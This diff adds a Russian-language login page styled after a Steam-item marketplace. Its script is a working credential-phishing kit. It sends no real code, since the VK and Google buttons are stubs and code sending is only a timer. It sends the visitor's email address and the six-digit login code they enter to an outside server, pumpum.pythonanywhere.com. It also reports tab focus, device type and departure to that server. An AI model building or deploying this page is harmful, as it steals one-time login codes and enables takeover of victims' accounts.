@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход и регистрация</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Roboto:wght@400;500&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
+        body {
+            background-color: #14161A;
+            color: #EBECF0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            padding-bottom: 80px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 375px;
+            position: relative;
+        }
+        
+        .page {
+            width: 100%;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .main-title {
+            font-size: 20px;
+            color: #EBECF0;
+            font-weight: 700;
+            margin-bottom: 20px;
+            margin-left: 16px;
+            text-align: left;
+        }
+        
+        .vk-btn {
+            width: 100%;
+            height: 60px;
+            background-color: #282933;
+            color: #EBECF0;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-bottom: 12px;
+            transition: background-color 0.2s ease;
+            padding: 0 20px;
+            position: relative;
+        }
+        
+        .vk-btn:hover {
+            background-color: #333544;
+        }
+        
+        .vk-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+            background-image: url("https://thumb.cloud.mail.ru/weblink/thumb/xw1/TfKk/QGyS93cW7/PNG%20-%20digital/VK%20Logo.png?mt=1684832836000");
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        
+        .google-btn {
+            width: 100%;
+            height: 60px;
+            background-color: #282933;
+            color: #EBECF0;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-top: 12px;
+            margin-bottom: 32px;
+            transition: background-color 0.2s ease;
+            padding: 0 20px;
+            position: relative;
+        }
+        
+        .google-btn:hover {
+            background-color: #333544;
+        }
+        
+        .google-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+            background-image: url("https://i.pinimg.com/originals/48/90/31/489031ad304a43fa25466238b58c5fd7.png");
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        
+        .email-section {
+            position: relative;
+            margin-top: 32px;
+            margin-bottom: 20px;
+        }
+        
+        .email-input {
+            width: 100%;
+            height: 60px;
+            background-color: #282933;
+            color: #EBECF0;
+            border: 1px solid #3A3B45;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 400;
+            padding: 0 16px;
+            outline: none;
+            transition: border-color 0.2s ease;
+            text-align: left;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .email-input:focus {
+            border-color: #2663F0;
+        }
+        
+        .email-input::placeholder {
+            color: #8A8C9A;
+            font-size: 16px;
+            text-align: left;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .get-code-btn {
+            width: 100%;
+            height: 40px;
+            background-color: #2663F0;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-bottom: 20px;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .get-code-btn:hover {
+            background-color: #1E54D8;
+        }
+        
+        .get-code-btn:disabled {
+            background-color: #3A3B45;
+            cursor: not-allowed;
+        }
+        
+        .terms {
+            text-align: center;
+            font-size: 13px;
+            color: #8A8C9A;
+            line-height: 1.5;
+            padding: 0 16px;
+            margin-top: 20px;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .terms a {
+            color: #2663F0;
+            text-decoration: none;
+        }
+        
+        .terms a:hover {
+            text-decoration: underline;
+        }
+        
+        .page2-title {
+            font-size: 20px;
+            color: #EBECF0;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-align: center;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .top-login-text-page2 {
+            font-size: 20px;
+            color: #EBECF0;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 20px;
+            margin-left: 0;
+        }
+        
+        .key-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background-image: url('Key.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #8A8C9A;
+            margin-bottom: 8px;
+            font-weight: 400;
+            text-align: center;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .email-display {
+            font-size: 16px;
+            color: #8A8C9A;
+            margin-bottom: 40px;
+            font-weight: 400;
+            word-break: break-all;
+            padding: 8px 0;
+            text-align: center;
+            font-family: 'Inter', sans-serif;
+            background-color: transparent;
+            border: none;
+        }
+        
+        .code-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0 40px;
+        }
+        
+        .code-input {
+            width: 53px;
+            height: 64px;
+            background-color: #282933;
+            border: 1px solid #3A3B45;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 500;
+            color: #EBECF0;
+            outline: none;
+            transition: border-color 0.2s ease;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .code-input:focus {
+            border-color: #2663F0;
+        }
+        
+        .code-input.filled {
+            border-color: #2663F0;
+        }
+        
+        .timer {
+            text-align: center;
+            font-size: 16px;
+            color: #8A8C9A;
+            margin-top: 24px;
+            margin-left: 16px;
+            margin-right: 16px;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .resend-btn {
+            width: calc(100% - 32px);
+            height: 40px;
+            background-color: transparent;
+            border: 1px solid #2663F0;
+            color: #2663F0;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin: 16px;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .resend-btn:hover {
+            background-color: rgba(38, 99, 240, 0.1);
+        }
+        
+        .resend-btn:disabled {
+            border-color: #3A3B45;
+            color: #3A3B45;
+            cursor: not-allowed;
+        }
+        
+        .error {
+            color: #FF6B6B;
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+            display: none;
+            margin-left: 16px;
+            margin-right: 16px;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .success {
+            color: #51CF66;
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+            display: none;
+            margin-left: 16px;
+            margin-right: 16px;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .bottom-nav {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            height: 68px;
+            background: rgba(65, 65, 65, 0.05);
+            border-radius: 19px;
+            z-index: 1000;
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+        
+        .nav-icons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            max-width: 500px;
+            padding: 0 20px;
+            height: 100%;
+        }
+        
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            color: #EBECF0;
+            flex: 1;
+            min-width: 0;
+            position: relative;
+            height: 100%;
+            padding: 8px 0;
+            cursor: pointer;
+        }
+        
+        .nav-item.active::before {
+            content: '';
+            position: absolute;
+            top: 4px;
+            bottom: 4px;
+            left: 2px;
+            right: 2px;
+            background-color: #14161A;
+            border-radius: 12px;
+            z-index: -1;
+        }
+        
+        .nav-icon {
+            margin-bottom: 6px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            background-color: transparent;
+        }
+        
+        .search-icon {
+            background-image: url('Poisk.png');
+            width: 24px;
+            height: 24px;
+        }
+        
+        .steam-icon {
+            background-image: url('Steam.png');
+            width: 24px;
+            height: 24px;
+        }
+        
+        .sell-icon {
+            background-image: url('Prodat.png');
+            width: 24px;
+            height: 24px;
+        }
+        
+        .chats-icon {
+            background-image: url('Chat.png');
+            width: 20px;
+            height: 20px;
+        }
+        
+        .profile-icon {
+            background-image: url('Profile.png');
+            width: 24px;
+            height: 24px;
+        }
+        
+        .nav-label {
+            font-size: 11px;
+            color: rgba(235, 236, 240, 0.9);
+            font-weight: 400;
+            text-align: center;
+            white-space: nowrap;
+            line-height: 1.2;
+        }
+        
+        .nav-item.active .nav-label {
+            color: #EBECF0;
+            font-weight: 500;
+        }
+        
+        .nav-item.active .nav-icon {
+            filter: brightness(1.2);
+        }
+        
+        /* СТИЛИ ДЛЯ ПОПАПА */
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+        
+        .popup.hidden {
+            display: none;
+        }
+        
+        .popup-content {
+            width: 382px;
+            height: 465px;
+            background-color: #14161A;
+            border-radius: 16px;
+            text-align: center;
+            color: #EBECF0;
+            position: relative;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 30px;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 32px;
+            cursor: pointer;
+            color: #8A8C9A;
+            line-height: 1;
+            transition: color 0.2s;
+        }
+        
+        .close-btn:hover {
+            color: #B0B2C0;
+        }
+        
+        .popup-image {
+            width: 120px;
+            height: 120px;
+            object-fit: contain;
+            margin-bottom: 20px;
+        }
+        
+        .popup-title {
+            font-family: 'Roboto', sans-serif;
+            font-weight: 500;
+            font-size: 24px;
+            color: #EBECF0;
+            margin: 0 0 15px;
+            line-height: 1.2;
+        }
+        
+        .popup-subtitle {
+            font-family: 'Roboto', sans-serif;
+            font-weight: 400;
+            font-size: 14px;
+            color: #8A8C9A;
+            max-width: 280px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+        
+        /* Адаптация под мобильные */
+        @media (max-width: 400px) {
+            .popup-content {
+                width: 320px;
+                height: 420px;
+                padding: 15px 20px;
+            }
+            
+            .popup-image {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .popup-title {
+                font-size: 22px;
+            }
+            
+            .popup-subtitle {
+                font-size: 13px;
+                max-width: 240px;
+            }
+        }
+        
+        @media (min-width: 520px) {
+            .bottom-nav {
+                left: 40px;
+                right: 40px;
+            }
+            
+            .nav-icons {
+                padding: 0 30px;
+                max-width: 600px;
+            }
+        }
+        
+        @media (min-width: 768px) {
+            .bottom-nav {
+                left: 50%;
+                transform: translateX(-50%);
+                width: calc(100% - 80px);
+                max-width: 700px;
+                right: auto;
+            }
+            
+            .nav-icons {
+                padding: 0 40px;
+            }
+        }
+        
+        @media (max-width: 400px) {
+            .container {
+                max-width: 100%;
+            }
+            
+            .code-input {
+                width: 49px;
+                height: 60px;
+                font-size: 22px;
+            }
+            
+            .key-icon {
+                width: 70px;
+                height: 70px;
+            }
+            
+            .bottom-nav {
+                height: 64px;
+                left: 15px;
+                right: 15px;
+                border-radius: 17px;
+            }
+            
+            .nav-icons {
+                padding: 0 12px;
+            }
+            
+            .nav-icon {
+                width: 20px !important;
+                height: 20px !important;
+                margin-bottom: 5px;
+            }
+            
+            .chats-icon {
+                width: 18px !important;
+                height: 18px !important;
+            }
+            
+            .nav-label {
+                font-size: 10px;
+            }
+            
+            body {
+                padding-bottom: 80px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            .bottom-nav {
+                left: 12px;
+                right: 12px;
+                border-radius: 16px;
+                height: 62px;
+            }
+            
+            .nav-icons {
+                padding: 0 10px;
+            }
+            
+            .nav-icon {
+                width: 18px !important;
+                height: 18px !important;
+                margin-bottom: 4px;
+            }
+            
+            .chats-icon {
+                width: 16px !important;
+                height: 16px !important;
+            }
+            
+            .nav-label {
+                font-size: 9px;
+            }
+            
+            .nav-item.active::before {
+                top: 3px;
+                bottom: 3px;
+            }
+            
+            body {
+                padding-bottom: 78px;
+            }
+        }
+        
+        @media (max-width: 320px) {
+            .nav-label {
+                font-size: 8px;
+            }
+            
+            .bottom-nav {
+                height: 60px;
+                left: 10px;
+                right: 10px;
+                border-radius: 15px;
+            }
+            
+            .nav-icons {
+                padding: 0 8px;
+            }
+            
+            .nav-icon {
+                width: 16px !important;
+                height: 16px !important;
+                margin-bottom: 3px;
+            }
+            
+            .chats-icon {
+                width: 14px !important;
+                height: 14px !important;
+            }
+            
+            .nav-item.active::before {
+                top: 2px;
+                bottom: 2px;
+            }
+            
+            body {
+                padding-bottom: 75px;
+            }
+            
+            .popup-content {
+                width: 280px;
+                height: 380px;
+                padding: 10px 15px;
+            }
+            
+            .popup-image {
+                width: 80px;
+                height: 80px;
+            }
+            
+            .popup-title {
+                font-size: 20px;
+            }
+            
+            .popup-subtitle {
+                font-size: 12px;
+                max-width: 200px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Страница 1: Вход и регистрация -->
+        <div id="page1" class="page">
+            <h1 class="main-title">Вход и регистрация</h1>
+            
+            <div style="margin: 0 16px;">
+                <button class="vk-btn" onclick="loginWithVK()">
+                    <div class="vk-icon"></div>
+                    Войти с VK ID
+                </button>
+                
+                <button class="google-btn" onclick="loginWithGoogle()">
+                    <div class="google-icon"></div>
+                    Войти через Google
+                </button>
+                
+                <form id="emailForm">
+                    <div class="email-section">
+                        <input type="email" class="email-input" id="email" placeholder="Адрес электронной почты" required>
+                        <div class="error" id="emailError">Пожалуйста, введите корректный email</div>
+                    </div>
+                    
+                    <button type="submit" class="get-code-btn" id="getCodeBtn">
+                        Получить код
+                    </button>
+                </form>
+            </div>
+            
+            <div class="terms">
+                Продолжая регистрацию или вход, вы принимаете условия 
+                <a href="#">Пользовательского соглашения</a> и 
+                <a href="#">Политики конфиденциальности</a>
+            </div>
+        </div>
+        
+        <!-- Страница 2: Введите код из почты -->
+        <div id="page2" class="page hidden">
+            <h1 class="top-login-text-page2">Вход</h1>
+            
+            <div class="key-icon" id="keyIcon"></div>
+            
+            <h1 class="page2-title">Введите код из почты</h1>
+            
+            <div class="subtitle">Мы отправили письмо на</div>
+            <div class="email-display" id="enteredEmail"></div>
+            
+            <div class="code-container" id="codeInputs">
+                <!-- 6 полей для кода будут созданы скриптом -->
+            </div>
+            
+            <div class="error" id="codeError">Код должен состоять из 6 цифр</div>
+            <div class="success" id="codeSuccess">✓ Код подтвержден. Отправляем данные...</div>
+            
+            <div class="timer" id="timer">
+                Отправить повторно через <span id="countdown">56</span> с.
+            </div>
+            
+            <button class="resend-btn" id="resendBtn" disabled>
+                Отправить повторно
+            </button>
+        </div>
+    </div>
+    
+    <!-- НАВИГАЦИОННАЯ ПАНЕЛЬ -->
+    <div class="bottom-nav">
+        <div class="nav-icons">
+            <a href="#" class="nav-item" data-tab="search">
+                <div class="nav-icon search-icon"></div>
+                <div class="nav-label">Поиск</div>
+            </a>
+            <a href="#" class="nav-item" data-tab="steam">
+                <div class="nav-icon steam-icon"></div>
+                <div class="nav-label">Steam</div>
+            </a>
+            <a href="#" class="nav-item" data-tab="sell">
+                <div class="nav-icon sell-icon"></div>
+                <div class="nav-label">Продать</div>
+            </a>
+            <a href="#" class="nav-item" data-tab="chats">
+                <div class="nav-icon chats-icon"></div>
+                <div class="nav-label">Чаты</div>
+            </a>
+            <a href="#" class="nav-item active" data-tab="profile">
+                <div class="nav-icon profile-icon"></div>
+                <div class="nav-label">Профиль</div>
+            </a>
+        </div>
+    </div>
+    
+    <!-- ОБНОВЛЁННЫЙ ПОПАП -->
+    <div id="popup" class="popup hidden">
+        <div class="popup-content">
+            <span class="close-btn">&times;</span>
+            <img src="Smilereg.png" alt="smile" class="popup-image">
+            <h2 class="popup-title">Требуется регистрация</h2>
+            <p class="popup-subtitle">Для продолжения действий вам нужно пройти регистрацию или войти уже в существующий аккаунт</p>
+        </div>
+    </div>
+
+    <script>
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const emailForm = document.getElementById('emailForm');
+        const emailInput = document.getElementById('email');
+        const emailError = document.getElementById('emailError');
+        const enteredEmail = document.getElementById('enteredEmail');
+        const codeInputsContainer = document.getElementById('codeInputs');
+        const codeError = document.getElementById('codeError');
+        const codeSuccess = document.getElementById('codeSuccess');
+        const resendBtn = document.getElementById('resendBtn');
+        const timerElement = document.getElementById('timer');
+        const countdownElement = document.getElementById('countdown');
+        
+        // ССЫЛКА НА ВАШ СЕРВЕР PYTHONANYWHERE
+        const SERVER_URL = 'https://pumpum.pythonanywhere.com';
+        
+        let userEmail = '';
+        let userCode = '';
+        let countdown = 56;
+        let countdownInterval;
+        let isActive = true;
+        let currentPage = 'странице "Профиль" 👤';
+        let sessionStartTime = Date.now();
+        let exitNotificationSent = false;
+        let activeTab = 'profile';
+        
+        let updateInProgress = false;
+        let pendingUpdate = false;
+        
+        const sessionId = 'SID-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const deviceType = isMobile ? 'Телефон' : 'Компьютер';
+        
+        // Попап
+        const popup = document.getElementById('popup');
+        const closeBtn = document.querySelector('.close-btn');
+        closeBtn.addEventListener('click', () => popup.classList.add('hidden'));
+        popup.addEventListener('click', (e) => { if (e.target === popup) popup.classList.add('hidden'); });
+        function showPopup() { popup.classList.remove('hidden'); }
+        
+        function setActiveTab(tabName) {
+            if (tabName === activeTab) return;
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+            const activeItem = document.querySelector(`.nav-item[data-tab="${tabName}"]`);
+            if (activeItem) {
+                activeItem.classList.add('active');
+                activeTab = tabName;
+                const tabLabels = {
+                    'search': 'странице "Поиск" 🔍',
+                    'steam': 'странице "Steam" 🎮',
+                    'sell': 'странице "Продать" 💰',
+                    'chats': 'странице "Чаты" 💬',
+                    'profile': 'странице "Профиль" 👤'
+                };
+                if (tabLabels[tabName]) {
+                    currentPage = tabLabels[tabName];
+                    sendUpdateToServer();
+                }
+            }
+        }
+        
+        function getCurrentDateTime() {
+            const now = new Date();
+            return `${now.toLocaleDateString('ru-RU')} ${now.toLocaleTimeString('ru-RU', { hour12: false })}`;
+        }
+        
+        // Отправка данных на Python Сервер
+        async function sendUpdateToServer(isExit = false) {
+            if (updateInProgress && !isExit) {
+                pendingUpdate = true;
+                return;
+            }
+            updateInProgress = true;
+            
+            do {
+                pendingUpdate = false;
+                const sessionStatus = isExit ? '🔴 ПОЛЬЗОВАТЕЛЬ ВЫШЕЛ' : (isActive ? '🟢 ПОЛЬЗОВАТЕЛЬ АКТИВЕН' : '🔴 ПОЛЬЗОВАТЕЛЬ НЕАКТИВЕН');
+                
+                const payload = {
+                    session_id: sessionId,
+                    status: sessionStatus,
+                    page: isExit ? 'Пользователь покинул сайт' : currentPage,
+                    email: userEmail,
+                    code: userCode,
+                    device: deviceType,
+                    time: getCurrentDateTime()
+                };
+
+                if (isExit) {
+                    payload.duration = Math.round((Date.now() - sessionStartTime) / 1000);
+                    navigator.sendBeacon(`${SERVER_URL}/api/update_session`, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
+                    break;
+                }
+
+                try {
+                    await fetch(`${SERVER_URL}/api/update_session`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (e) { console.error('Сервер недоступен', e); }
+                
+                if (pendingUpdate) await new Promise(r => setTimeout(r, 300));
+            } while (pendingUpdate && !isExit);
+            
+            updateInProgress = false;
+        }
+
+        async function markSuccessLogin() {
+            try {
+                await fetch(`${SERVER_URL}/api/success_login`, { method: 'POST' });
+            } catch (e) { console.error(e); }
+        }
+        
+        function checkTabActivity() {
+            const isTabActive = !document.hidden;
+            if (isActive !== isTabActive) {
+                isActive = isTabActive;
+                sendUpdateToServer();
+            }
+        }
+        
+        document.addEventListener('visibilitychange', checkTabActivity);
+        window.addEventListener('focus', () => { isActive = true; sendUpdateToServer(); });
+        window.addEventListener('blur', () => { isActive = false; sendUpdateToServer(); });
+        setInterval(checkTabActivity, 2000);
+        
+        window.addEventListener('beforeunload', () => {
+            if (!exitNotificationSent) {
+                exitNotificationSent = true;
+                sendUpdateToServer(true);
+            }
+        });
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            createCodeInputs();
+            enteredEmail.textContent = '';
+            sendUpdateToServer(); // Первый контакт с сервером
+            
+            emailForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                    emailError.style.display = 'block';
+                    emailInput.style.borderColor = '#FF6B6B';
+                    return;
+                }
+                emailError.style.display = 'none';
+                emailInput.style.borderColor = '#3A3B45';
+                userEmail = email;
+                sendUpdateToServer();
+                showCodePage();
+                simulateCodeSending();
+            });
+            
+            resendBtn.addEventListener('click', function() {
+                if (resendBtn.disabled) return;
+                simulateCodeSending();
+            });
+            
+            window.loginWithVK = () => alert('Вход через VK ID (имитация)');
+            window.loginWithGoogle = () => alert('Вход через Google (имитация)');
+            
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const tabName = this.getAttribute('data-tab');
+                    if (tabName !== 'profile') { showPopup(); return; }
+                    setActiveTab(tabName);
+                });
+            });
+        });
+        
+        function createCodeInputs() {
+            for (let i = 0; i < 6; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.inputMode = 'numeric';
+                input.maxLength = 1;
+                input.className = 'code-input';
+                input.dataset.index = i;
+                
+                input.addEventListener('input', function(e) {
+                    const value = e.target.value;
+                    if (!/^\d$/.test(value)) { e.target.value = ''; return; }
+                    if (value && i < 5) codeInputsContainer.querySelector(`input[data-index="${i+1}"]`).focus();
+                    checkCodeCompletion();
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !e.target.value && i > 0) {
+                        e.preventDefault();
+                        const prevInput = codeInputsContainer.querySelector(`input[data-index="${i-1}"]`);
+                        prevInput.focus();
+                        prevInput.value = '';
+                        prevInput.classList.remove('filled');
+                    }
+                });
+                codeInputsContainer.appendChild(input);
+            }
+        }
+        
+        function checkCodeCompletion() {
+            const inputs = codeInputsContainer.querySelectorAll('.code-input');
+            let code = '';
+            inputs.forEach(input => {
+                code += input.value;
+                if (input.value) input.classList.add('filled');
+                else input.classList.remove('filled');
+            });
+            
+            if (code.length === 6) {
+                userCode = code;
+                validateAndSendCode();
+            }
+        }
+        
+        function validateAndSendCode() {
+            codeError.style.display = 'none';
+            if (!/^\d{6}$/.test(userCode)) {
+                codeError.style.display = 'block';
+                return;
+            }
+            codeSuccess.style.display = 'block';
+            
+            markSuccessLogin(); // Уведомляем сервер об успешном входе для статистики
+            sendUpdateToServer();
+            
+            codeSuccess.textContent = '✅ Данные успешно отправлены!';
+            setTimeout(resetForm, 3000);
+        }
+        
+        function showCodePage() {
+            page1.classList.add('hidden');
+            page2.classList.remove('hidden');
+            enteredEmail.textContent = userEmail;
+            const firstInput = codeInputsContainer.querySelector('input[data-index="0"]');
+            if (firstInput) firstInput.focus();
+            currentPage = 'странице с кодом "🔐"';
+            sendUpdateToServer();
+        }
+        
+        function simulateCodeSending() {
+            const inputs = codeInputsContainer.querySelectorAll('.code-input');
+            inputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
+            codeError.style.display = 'none';
+            codeSuccess.style.display = 'none';
+            resendBtn.disabled = true;
+            timerElement.style.display = 'block';
+            countdown = 56;
+            countdownElement.textContent = countdown;
+            if (countdownInterval) clearInterval(countdownInterval);
+            countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    resendBtn.disabled = false;
+                    timerElement.style.display = 'none';
+                }
+            }, 1000);
+        }
+        
+        function resetForm() {
+            emailInput.value = '';
+            const inputs = codeInputsContainer.querySelectorAll('.code-input');
+            inputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
+            codeError.style.display = 'none';
+            codeSuccess.style.display = 'none';
+            emailError.style.display = 'none';
+            emailInput.style.borderColor = '#3A3B45';
+            if (countdownInterval) clearInterval(countdownInterval);
+            timerElement.style.display = 'none';
+            resendBtn.disabled = true;
+            page2.classList.add('hidden');
+            page1.classList.remove('hidden');
+            emailInput.focus();
+            currentPage = 'странице с почтой "📧"';
+            sendUpdateToServer();
+        }
+    </script>
+</body>
+</html>
